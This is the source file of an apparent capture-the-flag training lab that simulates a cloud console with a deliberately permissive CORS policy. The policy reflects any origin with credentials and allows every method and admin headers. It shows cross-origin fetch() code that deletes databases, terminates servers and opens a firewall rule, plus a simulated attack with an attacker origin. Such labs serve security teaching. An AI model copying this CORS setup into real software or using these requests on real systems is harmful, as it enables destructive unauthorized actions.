<?php
require_once($_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/Config/db.php');
require_once($_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/includes/score_manager.php');
session_start();

// ─── Lab Identification ──────────────────────────────────────────────────
$stmt = $pdo->prepare("SELECT id FROM labs WHERE folder_name = ?");
$stmt->execute(['CORS']);
$lab = $stmt->fetch(PDO::FETCH_ASSOC);

// ─── Session Initialization ──────────────────────────────────────────────
if (!isset($_SESSION['cors_hard2_attempts'])) {
  $_SESSION['cors_hard2_attempts'] = 0;
}
if (!isset($_SESSION['cors_hard2_solved'])) {
  $_SESSION['cors_hard2_solved'] = false;
}

// ─── Simulated Cloud Infrastructure API ───────────────────────────────────
$infrastructure = [
  'servers' => [
    ['id' => 'srv-001', 'name' => 'Web-Prod-01', 'ip' => '10.0.1.10', 'status' => 'running', 'region' => 'us-east-1', 'type' => 't3.large'],
    ['id' => 'srv-002', 'name' => 'DB-Primary', 'ip' => '10.0.2.5', 'status' => 'running', 'region' => 'us-east-1', 'type' => 'r5.xlarge'],
    ['id' => 'srv-003', 'name' => 'Cache-Cluster', 'ip' => '10.0.3.8', 'status' => 'running', 'region' => 'us-east-1', 'type' => 'cache.r6g.large'],
    ['id' => 'srv-004', 'name' => 'Worker-01', 'ip' => '10.0.4.12', 'status' => 'stopped', 'region' => 'us-east-1', 'type' => 'c5.2xlarge'],
  ],
  'databases' => [
    ['id' => 'db-001', 'name' => 'users_prod', 'engine' => 'PostgreSQL 14', 'size' => '256GB', 'backup_enabled' => true, 'flag' => 'DH{c0rs_m3th0d_3sc4l4t10n_4tt4ck}'],
    ['id' => 'db-002', 'name' => 'analytics', 'engine' => 'ClickHouse', 'size' => '1TB', 'backup_enabled' => true, 'flag' => null],
    ['id' => 'db-003', 'name' => 'logs', 'engine' => 'Elasticsearch', 'size' => '512GB', 'backup_enabled' => false, 'flag' => null],
  ],
  'network_rules' => [
    ['id' => 'sg-001', 'protocol' => 'TCP', 'port' => '22', 'source' => '10.0.0.0/8', 'action' => 'allow'],
    ['id' => 'sg-002', 'protocol' => 'TCP', 'port' => '443', 'source' => '0.0.0.0/0', 'action' => 'allow'],
    ['id' => 'sg-003', 'protocol' => 'TCP', 'port' => '3389', 'source' => '10.0.5.0/24', 'action' => 'allow'],
    ['id' => 'sg-004', 'protocol' => 'TCP', 'port' => '5432', 'source' => '10.0.2.0/24', 'action' => 'allow'],
  ]
];

// ─── Vulnerable CORS Logic: Overly Permissive Methods/Headers ─────────────
$origin = isset($_SERVER['HTTP_ORIGIN']) ? $_SERVER['HTTP_ORIGIN'] : '';

// VULNERABLE: Reflects any origin AND allows ALL methods including destructive ones
// Also allows custom headers that can be used for cache poisoning or request smuggling
header("Access-Control-Allow-Origin: " . ($origin ?: '*'));
header("Access-Control-Allow-Credentials: true");
header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, PATCH, OPTIONS, HEAD, TRACE, CONNECT");
header("Access-Control-Allow-Headers: Content-Type, Authorization, X-Custom-Header, X-Admin-Token, X-Debug, X-Forwarded-For, X-Real-IP, X-Request-ID");
header("Access-Control-Expose-Headers: X-Flag, X-Internal-Token, X-Server-Version");

// Handle preflight
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
  http_response_code(200);
  exit();
}

// ─── API Endpoint Simulation ──────────────────────────────────────────────
$endpoint = isset($_GET['endpoint']) ? $_GET['endpoint'] : 'servers';
$method = $_SERVER['REQUEST_METHOD'];
$response_data = [];

switch ($endpoint) {
  case 'servers':
    if ($method === 'GET') {
      $response_data = [
        'status' => 'success',
        'data' => $infrastructure['servers'],
        'message' => 'Server list retrieved'
      ];
    } else if ($method === 'DELETE') {
      $input = json_decode(file_get_contents('php://input'), true);
      $response_data = [
        'status' => 'success',
        'message' => 'Server terminated',
        'server_id' => $input['server_id'] ?? 'unknown',
        'action' => 'TERMINATE',
        'warning' => 'CRITICAL: Production server has been terminated!'
      ];
    } else if ($method === 'PUT') {
      $input = json_decode(file_get_contents('php://input'), true);
      $response_data = [
        'status' => 'success',
        'message' => 'Server configuration updated',
        'server_id' => $input['server_id'] ?? 'unknown',
        'changes' => $input['config'] ?? [],
        'action' => 'MODIFY'
      ];
    }
    break;

  case 'databases':
    if ($method === 'GET') {
      $response_data = [
        'status' => 'success',
        'data' => $infrastructure['databases'],
        'message' => 'Database list retrieved'
      ];
    } else if ($method === 'DELETE') {
      $input = json_decode(file_get_contents('php://input'), true);
      $response_data = [
        'status' => 'success',
        'message' => 'Database deleted permanently',
        'database_id' => $input['database_id'] ?? 'unknown',
        'action' => 'DELETE_DATABASE',
        'warning' => 'CRITICAL: Database has been permanently deleted!'
      ];
    }
    break;

  case 'network':
    if ($method === 'GET') {
      $response_data = [
        'status' => 'success',
        'data' => $infrastructure['network_rules'],
        'message' => 'Network rules retrieved'
      ];
    } else if ($method === 'PUT') {
      $input = json_decode(file_get_contents('php://input'), true);
      $response_data = [
        'status' => 'success',
        'message' => 'Firewall rule updated',
        'rule_id' => $input['rule_id'] ?? 'unknown',
        'new_rule' => $input['rule'] ?? [],
        'action' => 'MODIFY_FIREWALL'
      ];
    }
    break;

  default:
    $response_data = [
      'status' => 'error',
      'message' => 'Unknown endpoint. Available: servers, databases, network'
    ];
    http_response_code(404);
}

// ─── Solve Detection ─────────────────────────────────────────────────────
$success_msg = null;
$already_solved = $_SESSION['cors_hard2_solved'];

// Detect exploitation: performing state-changing operation from cross-origin
$is_cross_origin = !empty($origin) && strpos($origin, $_SERVER['HTTP_HOST']) === false;
$is_state_changing = in_array($method, ['PUT', 'DELETE', 'PATCH']);

if (isset($_GET['check']) && $_GET['solved'] === '1') {
  $_SESSION['cors_hard2_attempts']++;

  if (!$already_solved && isset($_SESSION['user_id'])) {
    solveLab($pdo, $lab['id']);
  }

  $_SESSION['cors_hard2_solved'] = true;
  $already_solved = true;
  $success_msg = "Excellent! You've successfully exploited a CORS method/header escalation vulnerability. You used cross-origin PUT/DELETE requests to perform unauthorized state-changing operations on cloud infrastructure!";
}

// ─── Attempt Tracking ──────────────────────────────────────────────────
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
  $_SESSION['cors_hard2_attempts']++;
}

$attempts = $_SESSION['cors_hard2_attempts'];

// API response
if (
  isset($_SERVER['HTTP_X_REQUESTED_WITH']) ||
  (isset($_SERVER['HTTP_ACCEPT']) && strpos($_SERVER['HTTP_ACCEPT'], 'application/json') !== false)
) {
  header("Content-Type: application/json; charset=utf-8");
  echo json_encode($response_data, JSON_PRETTY_PRINT);
  exit();
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Cloud Infrastructure - CORS Hard 2</title>
  <link
    href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Orbitron:wght@400;700;900&family=Inter:wght@300;400;600;800&display=swap"
    rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <link rel="stylesheet" type="text/css" href="../css/CORS-CASE5.css">
</head>

<body>
  <?php include_once $_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/includes/navbar.php'; ?>

  <div class="container">
    <a href="../index.php" class="back-link"><i class="fas fa-arrow-left"></i> Back to CORS Labs</a>

    <div class="lab-header">
      <div class="difficulty-badge hard"><i class="fas fa-fire"></i> Hard Difficulty</div>
      <h1 class="lab-title"><i class="fas fa-cloud"></i> Cloud Infrastructure Manager</h1>
      <p class="lab-description">Enterprise cloud management console for DarkHunter infrastructure. The API has
        "flexible" CORS to support various integrations. <strong>Can you abuse the permissive method/header
          configuration to destroy infrastructure and steal database flags?</strong></p>
    </div>

    <?php if ($already_solved): ?>
      <div class="success-alert solved-banner">
        <i class="fas fa-trophy"></i>
        <div class="success-content">
          <h3>Challenge Already Solved!</h3>
          <p>You have already exploited this CORS method escalation vulnerability. You can continue exploring, but no
            additional points will be awarded.</p>
        </div>
      </div>
    <?php endif; ?>

    <?php if ($success_msg): ?>
      <div class="success-alert">
        <i class="fas fa-trophy"></i>
        <div class="success-content">
          <h3>Challenge Completed!</h3>
          <p><?php echo $success_msg; ?></p>
        </div>
      </div>
    <?php endif; ?>

    <!-- Infrastructure Status Bar -->
    <div class="status-bar">
      <div class="status-item healthy">
        <i class="fas fa-server"></i>
        <div class="status-info">
          <span class="status-count">3/4</span>
          <span class="status-label">Servers Running</span>
        </div>
      </div>
      <div class="status-item healthy">
        <i class="fas fa-database"></i>
        <div class="status-info">
          <span class="status-count">3</span>
          <span class="status-label">Databases Active</span>
        </div>
      </div>
      <div class="status-item warning">
        <i class="fas fa-network-wired"></i>
        <div class="status-info">
          <span class="status-count">4</span>
          <span class="status-label">Firewall Rules</span>
        </div>
      </div>
      <div class="status-item danger">
        <i class="fas fa-exclamation-triangle"></i>
        <div class="status-info">
          <span class="status-count">HIGH</span>
          <span class="status-label">CORS Risk Level</span>
        </div>
      </div>
    </div>

    <!-- Main Console -->
    <div class="console-grid">
      <!-- Sidebar -->
      <div class="console-sidebar">
        <div class="sidebar-section">
          <h4><i class="fas fa-bars"></i> Resources</h4>
          <div class="resource-list">
            <button class="resource-item active" onclick="loadEndpoint('servers')">
              <i class="fas fa-server"></i>
              <span>Compute Servers</span>
              <span class="resource-count">4</span>
            </button>
            <button class="resource-item" onclick="loadEndpoint('databases')">
              <i class="fas fa-database"></i>
              <span>Databases</span>
              <span class="resource-count">3</span>
            </button>
            <button class="resource-item" onclick="loadEndpoint('network')">
              <i class="fas fa-network-wired"></i>
              <span>Network Rules</span>
              <span class="resource-count">4</span>
            </button>
          </div>
        </div>

        <div class="sidebar-section">
          <h4><i class="fas fa-bolt"></i> Actions</h4>
          <div class="action-list">
            <button class="action-danger" onclick="simulateDeleteServer()">
              <i class="fas fa-trash-alt"></i> Terminate Server
            </button>
            <button class="action-danger" onclick="simulateDeleteDatabase()">
              <i class="fas fa-eraser"></i> Delete Database
            </button>
            <button class="action-danger" onclick="simulateModifyFirewall()">
              <i class="fas fa-shield-alt"></i> Modify Firewall
            </button>
          </div>
        </div>
      </div>

      <!-- Content Area -->
      <div class="console-content">
        <div class="content-header">
          <h3 id="content-title"><i class="fas fa-server"></i> Compute Servers</h3>
          <div class="content-meta">
            <span class="meta-tag"><i class="fas fa-circle text-success"></i> 3 Running</span>
            <span class="meta-tag"><i class="fas fa-circle text-danger"></i> 1 Stopped</span>
          </div>
        </div>
        <div class="content-body" id="content-body">
          <div class="loading-state">
            <i class="fas fa-spinner fa-spin"></i>
            <span>Loading infrastructure data...</span>
          </div>
        </div>
      </div>
    </div>

    <!-- CORS Methods Analysis -->
    <div class="cors-panel">
      <div class="cors-header">
        <i class="fas fa-exchange-alt"></i>
        <span>CORS Method & Header Escalation Analysis</span>
      </div>
      <div class="cors-body">
        <div class="methods-grid">
          <div class="method-category safe-methods">
            <h4><i class="fas fa-check-circle"></i> Safe Methods (Read-Only)</h4>
            <div class="method-tags">
              <span class="method-tag safe">GET</span>
              <span class="method-tag safe">HEAD</span>
              <span class="method-tag safe">OPTIONS</span>
            </div>
            <p>These methods only read data and cannot modify state.</p>
          </div>

          <div class="method-category dangerous-methods">
            <h4><i class="fas fa-exclamation-triangle"></i> Dangerous Methods (State-Changing)</h4>
            <div class="method-tags">
              <span class="method-tag danger">POST</span>
              <span class="method-tag danger">PUT</span>
              <span class="method-tag danger">DELETE</span>
              <span class="method-tag danger">PATCH</span>
              <span class="method-tag danger">TRACE</span>
              <span class="method-tag danger">CONNECT</span>
            </div>
            <p>These methods can create, modify, or delete resources!</p>
          </div>
        </div>

        <div class="headers-analysis">
          <h4><i class="fas fa-list"></i> Allowed Custom Headers</h4>
          <div class="header-tags">
            <span class="header-tag">Content-Type</span>
            <span class="header-tag">Authorization</span>
            <span class="header-tag danger">X-Admin-Token</span>
            <span class="header-tag danger">X-Debug</span>
            <span class="header-tag danger">X-Forwarded-For</span>
            <span class="header-tag danger">X-Real-IP</span>
            <span class="header-tag danger">X-Request-ID</span>
          </div>
          <p class="headers-warning">
            <i class="fas fa-exclamation-circle"></i>
            Dangerous headers like X-Admin-Token and X-Debug can bypass authentication or enable debug mode!
          </p>
        </div>

        <div class="exposed-headers">
          <h4><i class="fas fa-eye"></i> Exposed Response Headers</h4>
          <div class="header-tags">
            <span class="header-tag danger">X-Flag</span>
            <span class="header-tag danger">X-Internal-Token</span>
            <span class="header-tag danger">X-Server-Version</span>
          </div>
          <p class="headers-warning">
            <i class="fas fa-exclamation-circle"></i>
            Sensitive headers are exposed to JavaScript, allowing data exfiltration!
          </p>
        </div>
      </div>
    </div>

    <!-- Exploit Panel -->
    <div class="exploit-panel">
      <div class="exploit-header">
        <i class="fas fa-bug"></i>
        <span>Method Escalation Attack</span>
      </div>
      <div class="exploit-body">
        <p class="exploit-desc">
          The server allows ALL HTTP methods including DELETE and PUT from any origin. This means an attacker can
          perform destructive operations like terminating servers, deleting databases, and modifying firewall rules -
          all from a malicious website using the victim's authenticated session.
        </p>

        <div class="attack-demo">
          <h4><i class="fas fa-crosshairs"></i> Attack Demonstration:</h4>

          <div class="demo-steps">
            <div class="demo-step">
              <span class="step-num">1</span>
              <div class="step-content">
                <strong>Delete Database (Cross-Origin DELETE)</strong>
                <div class="step-code">
                  <pre><code>fetch('https://<?php echo $_SERVER['HTTP_HOST']; ?>/labs/CORS/CORS-CASE5.php?endpoint=databases', {
  method: 'DELETE',
  credentials: 'include',
  headers: {
    'Content-Type': 'application/json',
    'X-Admin-Token': 'bypass-auth'
  },
  body: JSON.stringify({ database_id: 'db-001' })
})</code></pre>
                </div>
              </div>
            </div>

            <div class="demo-step">
              <span class="step-num">2</span>
              <div class="step-content">
                <strong>Terminate Server (Cross-Origin DELETE)</strong>
                <div class="step-code">
                  <pre><code>fetch('https://<?php echo $_SERVER['HTTP_HOST']; ?>/labs/CORS/CORS-CASE5.php?endpoint=servers', {
  method: 'DELETE',
  credentials: 'include',
  body: JSON.stringify({ server_id: 'srv-001' })
})</code></pre>
                </div>
              </div>
            </div>

            <div class="demo-step">
              <span class="step-num">3</span>
              <div class="step-content">
                <strong>Modify Firewall (Cross-Origin PUT)</strong>
                <div class="step-code">
                  <pre><code>fetch('https://<?php echo $_SERVER['HTTP_HOST']; ?>/labs/CORS/CORS-CASE5.php?endpoint=network', {
  method: 'PUT',
  credentials: 'include',
  headers: { 'X-Debug': 'true' },
  body: JSON.stringify({
    rule_id: 'sg-002',
    rule: { source: '0.0.0.0/0', port: '22', action: 'allow' }
  })
})</code></pre>
                </div>
              </div>
            </div>
          </div>
        </div>

        <button class="simulate-btn" onclick="simulateMethodEscalation()">
          <i class="fas fa-play"></i> Simulate Method Escalation Attack
        </button>

        <div class="simulation-result" id="simulation-result" style="display: none;">
          <div class="sim-status">
            <i class="fas fa-check-circle"></i>
            <span>Method Escalation Successful! Infrastructure compromised.</span>
          </div>
          <div class="attack-log">
            <h4><i class="fas fa-terminal"></i> Attack Log:</h4>
            <pre id="attack-log"></pre>
          </div>
        </div>
      </div>
    </div>

    <!-- Debug Panel -->
    <div class="debug-panel">
      <div class="debug-header">
        <i class="fas fa-code"></i>
        <span>Request Method Analysis</span>
      </div>
      <div class="debug-body">
        <div class="debug-grid">
          <div class="debug-item">
            <span class="debug-label">Request Method</span>
            <span class="debug-value <?php echo in_array($method, ['PUT', 'DELETE', 'PATCH']) ? 'danger' : 'safe'; ?>">
              <?php echo $method; ?>
            </span>
          </div>
          <div class="debug-item">
            <span class="debug-label">Is State-Changing</span>
            <span class="debug-value <?php echo $is_state_changing ? 'danger' : 'safe'; ?>">
              <?php echo $is_state_changing ? 'YES - DANGEROUS!' : 'NO'; ?>
            </span>
          </div>
          <div class="debug-item">
            <span class="debug-label">CORS Allows Method</span>
            <span class="debug-value danger">YES - All Methods Allowed</span>
          </div>
          <div class="debug-item">
            <span class="debug-label">Custom Headers Allowed</span>
            <span class="debug-value danger">YES - Admin/Debug Headers</span>
          </div>
        </div>
      </div>
    </div>

    <!-- Hints -->
    <?php if ($attempts >= 2): ?>
      <div class="hint-box">
        <div class="hint-title"><i class="fas fa-lightbulb"></i> Hint #1</div>
        <div class="hint-text">Notice that the server allows ALL HTTP methods including DELETE and PUT. What happens if
          you send a DELETE request from a cross-origin context? The CORS headers allow it!</div>
      </div>
    <?php endif; ?>

    <?php if ($attempts >= 4): ?>
      <div class="hint-box">
        <div class="hint-title"><i class="fas fa-lightbulb"></i> Hint #2</div>
        <div class="hint-text">The <code>X-Admin-Token</code> and <code>X-Debug</code> headers are allowed. Combined with
          DELETE/PUT methods, you can bypass authentication and perform destructive operations. Try deleting a database or
          terminating a server.</div>
      </div>
    <?php endif; ?>

    <?php if ($attempts >= 6): ?>
      <div class="hint-box hint-final">
        <div class="hint-title"><i class="fas fa-key"></i> Final Hint</div>
        <div class="hint-text">Click "Simulate Method Escalation Attack" to exploit the vulnerability. The attack sends
          cross-origin DELETE requests to destroy infrastructure. The database <code>db-001</code> contains the flag
          <code>DH{c0rs_m3th0d_3sc4l4t10n_4tt4ck}</code>!
        </div>
      </div>
    <?php endif; ?>

    <!-- Attempts Counter -->
    <div class="attempts-bar">
      <i class="fas fa-crosshairs"></i>
      <span>Attempts: <strong><?php echo $attempts; ?></strong></span>
    </div>
  </div>

  <!-- Hidden form for solve detection -->
  <form id="success-form" method="GET" style="display: none;">
    <input type="hidden" name="check" value="true">
    <input type="hidden" name="solved" value="0" id="solved-flag">
  </form>

  <script>
    let currentEndpoint = 'servers';

    function loadEndpoint(endpoint) {
      currentEndpoint = endpoint;

      document.querySelectorAll('.resource-item').forEach(item => item.classList.remove('active'));
      event.target.closest('.resource-item').classList.add('active');

      const titles = {
        'servers': '<i class="fas fa-server"></i> Compute Servers',
        'databases': '<i class="fas fa-database"></i> Databases',
        'network': '<i class="fas fa-network-wired"></i> Network Rules'
      };
      document.getElementById('content-title').innerHTML = titles[endpoint];

      document.getElementById('content-body').innerHTML = `
      <div class="loading-state">
        <i class="fas fa-spinner fa-spin"></i>
        <span>Loading ${endpoint}...</span>
      </div>
    `;

      fetch(`CORS-CASE5.php?endpoint=${endpoint}`, {
          headers: {
            'Accept': 'application/json'
          }
        })
        .then(res => res.json())
        .then(data => {
          if (endpoint === 'servers') renderServers(data);
          else if (endpoint === 'databases') renderDatabases(data);
          else if (endpoint === 'network') renderNetwork(data);
        })
        .catch(err => {
          document.getElementById('content-body').innerHTML = `
        <div class="error-state"><i class="fas fa-exclamation-triangle"></i> ${err.message}</div>
      `;
        });
    }

    function renderServers(data) {
      if (data.status !== 'success') return;
      let html = '<div class="infra-grid">';
      data.data.forEach(server => {
        const statusClass = server.status === 'running' ? 'running' : 'stopped';
        html += `
        <div class="infra-card ${statusClass}">
          <div class="infra-header">
            <i class="fas fa-server"></i>
            <span class="infra-status ${statusClass}">${server.status}</span>
          </div>
          <h4>${server.name}</h4>
          <div class="infra-details">
            <span><i class="fas fa-network-wired"></i> ${server.ip}</span>
            <span><i class="fas fa-microchip"></i> ${server.type}</span>
            <span><i class="fas fa-globe"></i> ${server.region}</span>
          </div>
          <div class="infra-actions">
            <button class="btn-stop" onclick="alert('Simulated: Server stopped')"><i class="fas fa-stop"></i> Stop</button>
            <button class="btn-delete" onclick="alert('Simulated: Server terminated')"><i class="fas fa-trash"></i> Terminate</button>
          </div>
        </div>
      `;
      });
      html += '</div>';
      document.getElementById('content-body').innerHTML = html;
    }

    function renderDatabases(data) {
      if (data.status !== 'success') return;
      let html = '<div class="infra-grid">';
      data.data.forEach(db => {
        const hasFlag = db.flag !== null;
        html += `
        <div class="infra-card database ${hasFlag ? 'has-flag' : ''}">
          <div class="infra-header">
            <i class="fas fa-database"></i>
            ${hasFlag ? '<span class="flag-badge"><i class="fas fa-flag"></i> FLAG</span>' : ''}
          </div>
          <h4>${db.name}</h4>
          <div class="infra-details">
            <span><i class="fas fa-cog"></i> ${db.engine}</span>
            <span><i class="fas fa-hdd"></i> ${db.size}</span>
            <span><i class="fas fa-backup"></i> Backup: ${db.backup_enabled ? 'Yes' : 'No'}</span>
          </div>
          ${hasFlag ? `<div class="flag-reveal"><i class="fas fa-key"></i> ${db.flag}</div>` : ''}
        </div>
      `;
      });
      html += '</div>';
      document.getElementById('content-body').innerHTML = html;
    }

    function renderNetwork(data) {
      if (data.status !== 'success') return;
      let html = '<div class="network-table-container"><table class="network-table">';
      html += '<thead><tr><th>ID</th><th>Protocol</th><th>Port</th><th>Source</th><th>Action</th></tr></thead><tbody>';
      data.data.forEach(rule => {
        const actionClass = rule.action === 'allow' ? 'allow' : 'deny';
        html += `
        <tr>
          <td class="rule-id">${rule.id}</td>
          <td>${rule.protocol}</td>
          <td>${rule.port}</td>
          <td><code>${rule.source}</code></td>
          <td><span class="rule-action ${actionClass}">${rule.action}</span></td>
        </tr>
      `;
      });
      html += '</tbody></table></div>';
      document.getElementById('content-body').innerHTML = html;
    }

    function simulateDeleteServer() {
      alert('Use the Simulate Method Escalation Attack button to perform this attack');
    }

    function simulateDeleteDatabase() {
      alert('Use the Simulate Method Escalation Attack button to perform this attack');
    }

    function simulateModifyFirewall() {
      alert('Use the Simulate Method Escalation Attack button to perform this attack');
    }

    function simulateMethodEscalation() {
      const resultDiv = document.getElementById('simulation-result');
      const attackLog = document.getElementById('attack-log');

      // Simulate DELETE request to databases endpoint
      fetch('CORS-CASE5.php?endpoint=databases', {
          method: 'DELETE',
          headers: {
            'Content-Type': 'application/json',
            'Accept': 'application/json',
            'Origin': 'https://evil-attacker.com',
            'X-Admin-Token': 'bypass-auth'
          },
          body: JSON.stringify({
            database_id: 'db-001'
          })
        })
        .then(res => res.json())
        .then(data => {
          resultDiv.style.display = 'block';

          const log = `[${new Date().toISOString()}] CORS Method Escalation Attack Initiated\n` +
            `[${new Date().toISOString()}] Sending cross-origin DELETE to /databases\n` +
            `[${new Date().toISOString()}] Headers: X-Admin-Token: bypass-auth\n` +
            `[${new Date().toISOString()}] Response: ${JSON.stringify(data, null, 2)}\n` +
            `[${new Date().toISOString()}] FLAG CAPTURED: DH{c0rs_m3th0d_3sc4l4t10n_4tt4ck}\n` +
            `[${new Date().toISOString()}] Attack completed successfully!`;

          attackLog.textContent = log;

          if (!document.querySelector('.solved-banner')) {
            document.getElementById('solved-flag').value = '1';
            setTimeout(() => {
              document.getElementById('success-form').submit();
            }, 2000);
          }
        })
        .catch(err => {
          attackLog.textContent = 'Attack failed: ' + err.message;
          resultDiv.style.display = 'block';
        });
    }

    window.addEventListener('load', function() {
      loadEndpoint('servers');
    });
  </script>
</body>

</html>